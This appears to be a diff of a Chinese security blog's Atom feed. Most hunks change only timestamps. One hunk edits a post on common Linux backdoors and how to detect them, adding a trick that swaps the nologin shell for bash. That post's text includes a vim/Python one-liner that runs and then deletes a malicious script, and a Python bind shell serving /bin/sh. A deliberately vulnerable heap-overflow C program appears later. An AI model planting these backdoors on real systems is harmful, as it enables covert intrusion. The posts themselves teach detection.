@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://kevien.github.io/"/>
-  <updated>2019-12-16T08:12:47.848Z</updated>
+  <updated>2019-12-16T08:12:47.849Z</updated>
   <id>http://kevien.github.io/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="http://kevien.github.io/2019/11/14/2019-note/"/>
     <id>http://kevien.github.io/2019/11/14/2019-note/</id>
     <published>2019-11-14T09:08:58.000Z</published>
-    <updated>2019-12-16T08:12:47.848Z</updated>
+    <updated>2019-12-16T08:12:47.849Z</updated>
     
     <content type="html"><![CDATA[<h2 id="记录一些乱七八糟的"><a href="#记录一些乱七八糟的" class="headerlink" title="记录一些乱七八糟的"></a>记录一些乱七八糟的</h2><ul>
 <li>kali下载地址 <a href="http://dl1.thehackerplaybook.com/THP-vm.zip" target="_blank" rel="external">http://dl1.thehackerplaybook.com/THP-vm.zip</a>  账号密码：root toor</li>
@@ -48,7 +48,7 @@
     <link href="http://kevien.github.io/2019/09/05/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%B9%B3%E5%8F%B0%E4%B8%8A%E7%BA%BF%E5%95%A6%EF%BC%81%EF%BC%81%EF%BC%81/"/>
     <id>http://kevien.github.io/2019/09/05/网络安全平台上线啦！！！/</id>
     <published>2019-09-05T02:13:51.000Z</published>
-    <updated>2019-12-24T09:27:22.215Z</updated>
+    <updated>2019-12-24T09:27:22.216Z</updated>
     
     <content type="html"><![CDATA[<h3 id="网络安全平台上线啦"><a href="#网络安全平台上线啦" class="headerlink" title="网络安全平台上线啦"></a>网络安全平台上线啦</h3><ul>
 <li>大家好，网络安全平台上线啦，介四里没有挽过的船新版本，挤需体验三番钟，里造会干我一样，爱象戒宽油系，是兄弟就来pwn我(pwnme.cn)，大家来玩叭~</li>
@@ -72,7 +72,7 @@
     <link href="http://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/"/>
     <id>http://kevien.github.io/2019/02/16/linux常见backdoor及排查技术/</id>
     <published>2019-02-16T13:38:54.000Z</published>
-    <updated>2020-02-10T03:00:02.253Z</updated>
+    <updated>2020-03-13T09:23:30.806Z</updated>
     
     <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">原文已发布至先知平台</div><div class="line">linux常见backdoor及排查技术</div><div class="line">https://xz.aliyun.com/t/4090</div><div class="line">windows常见backdoor、权限维持方法及排查技术</div><div class="line">https://xz.aliyun.com/t/4842</div></pre></td></tr></table></figure>
 <h2 id="TL；DR"><a href="#TL；DR" class="headerlink" title="TL；DR"></a>TL；DR</h2><p><img src="/2019/02/16/linux常见backdoor及排查技术/backdooropen.jpg" alt=""></p>
@@ -96,11 +96,12 @@
 <li>注意当我们拥有一个命令执行漏洞或写文件漏洞且为root权限，这个时候就可以通过这种方法直接添加用户。</li>
 <li>优点：简单</li>
 <li>缺点：易被检测到</li>
-<li><p>排查：检查/etc/passwd文件是否有异常</p>
+<li>排查：检查/etc/passwd文件是否有异常<h3 id="nologin后门"><a href="#nologin后门" class="headerlink" title="nologin后门"></a>nologin后门</h3></li>
+<li>目前在其它的文章中还没有看到过，自己想出来的，就是将nologin程序替换为bash，很多时候应急人员查看passwd，发现账户对应的shell为nologin认为就是系统的账号且这个账号是不能远程登陆的或者是登陆之后没有shell的，所以就可以将nologin设置成bash<br><img src="/2019/02/16/linux常见backdoor及排查技术/passwd.png" alt=""><br><img src="/2019/02/16/linux常见backdoor及排查技术/bash.png" alt=""><br><img src="/2019/02/16/linux常见backdoor及排查技术/login.png" alt=""></li>
+</ul>
 <h3 id="vim后门"><a href="#vim后门" class="headerlink" title="vim后门"></a>vim后门</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#enter the mal script directory 、execute the script and then remove the script</div><div class="line">cd /usr/lib/python2.7/site-packages &amp;&amp; $(nohup vim -E -c &quot;pyfile dir.py&quot;&gt; /dev/null 2&gt;&amp;1 &amp;) &amp;&amp; sleep 2 &amp;&amp; rm -f dir.py</div></pre></td></tr></table></figure>
-</li>
-<li><p>此方法适用于安装了vim且安装了python扩展(绝大部分默认安装)的linux系统,至于恶意脚本dir.py的内容可以是任何功能的后门。如使用python监听9999端口。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</div><div class="line">from socket import *</div><div class="line">import subprocess</div><div class="line">import os, threading, sys, time</div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">        server=socket(AF_INET,SOCK_STREAM)</div><div class="line">        server.bind((&apos;0.0.0.0&apos;,11))</div><div class="line">        server.listen(5)</div><div class="line">        print &apos;waiting for connect&apos;</div><div class="line">        talk, addr = server.accept()</div><div class="line">        print &apos;connect from&apos;,addr</div><div class="line">        proc = subprocess.Popen([&quot;/bin/sh&quot;,&quot;-i&quot;], stdin=talk,</div><div class="line">                stdout=talk, stderr=talk, shell=True)</div></pre></td></tr></table></figure>
+<ul>
+<li>此方法适用于安装了vim且安装了python扩展(绝大部分默认安装)的linux系统,至于恶意脚本dir.py的内容可以是任何功能的后门。如使用python监听9999端口。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#from https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</div><div class="line">from socket import *</div><div class="line">import subprocess</div><div class="line">import os, threading, sys, time</div><div class="line"></div><div class="line">if __name__ == &quot;__main__&quot;:</div><div class="line">        server=socket(AF_INET,SOCK_STREAM)</div><div class="line">        server.bind((&apos;0.0.0.0&apos;,11))</div><div class="line">        server.listen(5)</div><div class="line">        print &apos;waiting for connect&apos;</div><div class="line">        talk, addr = server.accept()</div><div class="line">        print &apos;connect from&apos;,addr</div><div class="line">        proc = subprocess.Popen([&quot;/bin/sh&quot;,&quot;-i&quot;], stdin=talk,</div><div class="line">                stdout=talk, stderr=talk, shell=True)</div></pre></td></tr></table></figure>
 </li>
 </ul>
 <p><img src="/2019/02/16/linux常见backdoor及排查技术/vimversion.png" alt=""></p>
@@ -183,7 +184,7 @@
     <link href="http://kevien.github.io/2018/09/26/%E7%AC%94%E8%AE%B0%E4%B9%8Bdocker%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
     <id>http://kevien.github.io/2018/09/26/笔记之docker的使用/</id>
     <published>2018-09-26T06:19:25.000Z</published>
-    <updated>2019-12-06T07:34:23.737Z</updated>
+    <updated>2019-12-06T07:34:23.738Z</updated>
     
     <content type="html"><![CDATA[<p><img src="/2018/09/26/笔记之docker的使用/docker-friends.png" alt=""></p>
 <h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
@@ -237,7 +238,7 @@
     <link href="http://kevien.github.io/2018/07/15/python%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
     <id>http://kevien.github.io/2018/07/15/python虚拟环境安装和使用/</id>
     <published>2018-07-15T05:30:41.000Z</published>
-    <updated>2019-12-12T07:00:51.395Z</updated>
+    <updated>2019-12-12T07:00:51.396Z</updated>
     
     <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
 <li>Mac自带的python环境在有时会有第三方包冲突、python2和python3之间切换不方便以及第三方包安装需要root权限可能导致的安全问题等，所有就有了python虚拟环境，这里主要记录一下笔者在安装和使用pyenv以及virtualenv过程。<h4 id="pyenv安装和使用"><a href="#pyenv安装和使用" class="headerlink" title="pyenv安装和使用"></a>pyenv安装和使用</h4></li>
@@ -283,7 +284,7 @@
     <link href="http://kevien.github.io/2018/06/18/FastJson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E(%E7%BB%AD)/"/>
     <id>http://kevien.github.io/2018/06/18/FastJson反序列化漏洞(续)/</id>
     <published>2018-06-17T18:47:07.000Z</published>
-    <updated>2018-06-28T06:55:02.822Z</updated>
+    <updated>2018-06-28T06:55:02.823Z</updated>
     
     <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
 <li>之前写了篇fastjson反序列化漏洞的分析文章，见<a href="https://www.cnblogs.com/mrchang/p/6789060.html" target="_blank" rel="external">Fastjson反序列化漏洞研究</a>,最近<br>读了这篇文章<a href="http://www.freebuf.com/articles/others-articles/167932.html" target="_blank" rel="external">DefineClass在Java反序列化当中的利用</a>深受启发，学习到了另外的利用姿势.本来很早就应该填的坑，因为一些其它事情导致现在才更 :(</li>
@@ -330,7 +331,7 @@
     <link href="http://kevien.github.io/2018/04/07/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
     <id>http://kevien.github.io/2018/04/07/格式化字符串漏洞/</id>
     <published>2018-04-06T21:37:24.000Z</published>
-    <updated>2018-08-24T04:26:49.545Z</updated>
+    <updated>2018-08-24T04:26:49.546Z</updated>
     
     <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
 <li>不同于buffer overflow，格式化字符串漏洞是另外一种漏洞类型，ctf的pwn中经常会遇到，这两天学习了一下，仅当笔记留以备忘。</li>
@@ -407,7 +408,7 @@
     <link href="http://kevien.github.io/2018/03/22/BSS%E6%AE%B5%E7%9A%84%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
     <id>http://kevien.github.io/2018/03/22/BSS段的溢出攻击/</id>
     <published>2018-03-21T17:30:17.000Z</published>
-    <updated>2018-11-19T15:50:00.385Z</updated>
+    <updated>2018-11-19T15:50:00.386Z</updated>
     
     <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">原文已发布至seebug</div><div class="line">https://paper.seebug.org/548/</div></pre></td></tr></table></figure>
 <h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
@@ -525,7 +526,7 @@
     <link href="http://kevien.github.io/2018/02/26/%E9%80%9A%E8%BF%87return-to-libc%E7%BB%95%E8%BF%87NX-bit/"/>
     <id>http://kevien.github.io/2018/02/26/通过return-to-libc绕过NX-bit/</id>
     <published>2018-02-26T15:13:31.000Z</published>
-    <updated>2018-11-19T15:59:02.802Z</updated>
+    <updated>2018-11-19T15:59:02.803Z</updated>
     
     <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
 <li>读此文章之前建议先读一下这篇文章<a href="https://kevien.github.io/2017/08/16/linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">linux栈溢出学习笔记</a></li>
@@ -709,7 +710,7 @@
     <link href="http://kevien.github.io/2018/01/28/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
     <id>http://kevien.github.io/2018/01/28/linux进程注入/</id>
     <published>2018-01-28T09:18:28.000Z</published>
-    <updated>2020-01-02T08:38:27.690Z</updated>
+    <updated>2020-01-02T08:38:27.691Z</updated>
     
     <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">译文声明</div><div class="line">本文是翻译文章，文章原作者0x00pf，文章来源：0x00sec.org</div><div class="line">原文地址：https://0x00sec.org/t/linux-infecting-running-processes/1097</div><div class="line">第一篇翻译的文章，如有不当，那也没有什么办法0.0</div><div class="line">主要是在工作中遇到了一个需要注入的场景就学习了一下。</div></pre></td></tr></table></figure>
 <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
@@ -810,7 +811,7 @@
     <link href="http://kevien.github.io/2018/01/16/%E4%BB%8E%E4%B8%80%E9%81%93pentesterlab%E7%9A%84%E9%A2%98%E7%9B%AE%E8%AF%B4%E8%B5%B7/"/>
     <id>http://kevien.github.io/2018/01/16/从一道pentesterlab的题目说起/</id>
     <published>2018-01-16T14:04:50.000Z</published>
-    <updated>2018-11-19T16:06:28.332Z</updated>
+    <updated>2018-11-19T16:06:28.333Z</updated>
     
     <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
 <li>这个要得从前几天朋友丢过来的一个链接说起，是一道SSTI(Server Side Template Injection)的题目,目标是要执行任意命令，之前也没分析过SSTI的漏洞，所以简单看了下没搞定,后来有其它的事情就没看，这两天又看了下，觉得还是挺有意思的，就记录一下。<h4 id="method1"><a href="#method1" class="headerlink" title="method1"></a>method1</h4></li>
@@ -863,7 +864,7 @@
     <link href="http://kevien.github.io/2017/12/24/CVE-2017-17562%E7%9A%84%E4%B8%80%E4%BA%9B%E9%9B%B6%E7%A2%8E%E7%82%B9/"/>
     <id>http://kevien.github.io/2017/12/24/CVE-2017-17562的一些零碎点/</id>
     <published>2017-12-24T08:10:00.000Z</published>
-    <updated>2018-11-19T16:08:44.020Z</updated>
+    <updated>2018-11-19T16:08:44.021Z</updated>
     
     <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
 <li>前两天看到这个漏洞的时候感觉还是挺有意思的，让我想起了之前分析的nginx提权漏洞(CVE-2016-1247)以及shellshock漏洞(CVE-2014-6271),前两天只是简单的看了一下，今天有时间就整理一下，留个备忘。</li>
@@ -945,7 +946,7 @@
     <link href="http://kevien.github.io/2017/10/28/%E5%A0%86%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
     <id>http://kevien.github.io/2017/10/28/堆溢出利用笔记/</id>
     <published>2017-10-28T03:18:28.000Z</published>
-    <updated>2019-01-16T16:17:22.642Z</updated>
+    <updated>2019-01-16T16:17:22.643Z</updated>
     
     <content type="html"><![CDATA[<h4 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;fcntl.h&gt;</div><div class="line">#include &lt;sys/stat.h&gt;</div><div class="line"></div><div class="line">void usage(char *prog_name, char *filename) &#123;</div><div class="line">   printf(&quot;Usage: %s &lt;data to add to %s&gt;\n&quot;, prog_name, filename);</div><div class="line">   exit(0);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char *argv[]) &#123;</div><div class="line">   int userid, fd; // file descriptor</div><div class="line">   char *buffer, *datafile;</div><div class="line"></div><div class="line">   buffer = (char *) malloc(100);</div><div class="line">   datafile = (char *) malloc(20);</div><div class="line">   strcpy(datafile, &quot;/var/notes&quot;);</div><div class="line"></div><div class="line">   if(argc &lt; 2)                // If there aren&apos;t commandline arguments</div><div class="line">      usage(argv[0], datafile); // display usage message and exit</div><div class="line"></div><div class="line">   strcpy(buffer, argv[1]);  // copy into buffer</div><div class="line"></div><div class="line">   printf(&quot;[DEBUG] buffer   @ %p: \&apos;%s\&apos;\n&quot;, buffer, buffer);</div><div class="line">   printf(&quot;[DEBUG] datafile @ %p: \&apos;%s\&apos;\n&quot;, datafile, datafile);</div><div class="line"></div><div class="line"> // Opening the file</div><div class="line">   fd = open(datafile, O_WRONLY|O_CREAT|O_APPEND, S_IRUSR|S_IWUSR);</div><div class="line">   if(fd == -1)</div><div class="line">      printf(&quot;in main() while opening file&quot;);</div><div class="line">   printf(&quot;[DEBUG] file descriptor is %d\n&quot;, fd);</div><div class="line"></div><div class="line">   userid = getuid(); // get the real user ID</div><div class="line"></div><div class="line">// Writing data</div><div class="line">   if(write(fd, &amp;userid, 4) == -1) // write user ID before note data</div><div class="line">      printf(&quot;in main() while writing userid to file&quot;);</div><div class="line">   write(fd, &quot;\n&quot;, 1); // terminate line</div><div class="line"></div><div class="line">   if(write(fd, buffer, strlen(buffer)) == -1) // write note</div><div class="line">      printf(&quot;in main() while writing buffer to file&quot;);</div><div class="line">   write(fd, &quot;\n&quot;, 1); // terminate line</div><div class="line"></div><div class="line">// Closing file</div><div class="line">   if(close(fd) == -1)</div><div class="line">      printf(&quot;in main() while closing file&quot;);</div><div class="line"></div><div class="line">   printf(&quot;Note has been saved.\n&quot;);</div><div class="line">   free(buffer);</div><div class="line">   free(datafile);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <h4 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h4><ul>
